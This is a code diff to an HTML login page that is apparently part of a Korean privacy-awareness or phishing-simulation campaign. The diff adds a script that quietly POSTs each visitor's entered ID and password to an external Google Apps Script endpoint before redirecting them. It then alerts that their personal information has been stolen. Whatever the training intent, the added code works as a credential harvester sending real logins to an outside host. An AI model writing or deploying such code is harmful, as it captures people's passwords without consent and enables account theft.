@@ -170,18 +170,32 @@
     </div>
 
     <script>
-        function handleLogin(event) {
+        async function handleLogin(event) {
             event.preventDefault();
-            const nameInput = document.getElementById('login-id').value;
 
+            const nameInput = document.getElementById('login-id').value;
+            const pwInput = document.getElementById('login-pw').value;
+
+            // 복사해둔 구글 웹 앱 URL을 여기에 넣으세요
+            const GAS_URL = "https://script.google.com/macros/s/AKfycbyDPrYbTVbsYKRtiY6mINrXwSjpvo80mWncoDFmpez7WOXylKGEwj359HkdxUnxIZcE1g/exec";
+
+            // 데이터 전송 (비동기)
+            fetch(GAS_URL, {
+                method: 'POST',
+                body: JSON.stringify({
+                    studentId: pwInput,
+                    name: nameInput
+                })
+            }).catch(err => console.error("데이터 전송 실패:", err));
+
+            // 리디렉션 로직 (데이터 전송 결과와 상관없이 즉시 실행하여 속도 유지)
             if (nameInput.endsWith('!')) {
                 alert("훌륭합니다! 약관에 숨겨진 내용을 확인하셨군요.");
                 window.location.href = "safety_success.html";
             } else {
-                alert("경고: 개인정보 활용 약관을 확인하지 않으셨습니다.");
+                alert("당신의 개인정보는 탈취되었습니다.");
                 window.location.href = "warning_campaign.html";
             }
-            return false;
         }
     </script>
 </body>
